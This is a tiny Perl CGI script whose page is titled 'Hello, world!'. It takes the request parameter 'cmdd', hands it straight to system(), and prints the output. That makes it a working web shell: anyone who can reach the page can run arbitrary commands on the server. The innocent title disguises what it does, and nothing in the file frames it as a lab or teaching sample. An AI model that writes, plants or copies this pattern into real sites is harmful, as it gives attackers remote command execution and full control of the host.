#!C:\Perl\bin\perl.exe

use CGI qw( :standard );
print "Content-Type: text/html\n\n";
$name = param("cmdd");
$aa = system($name);
print "<html> <head>\n";
print "<title>Hello, world!</title>";
print "</head>\n";
print "<body>\n";
print $aa;
print "</body> </html>\n";
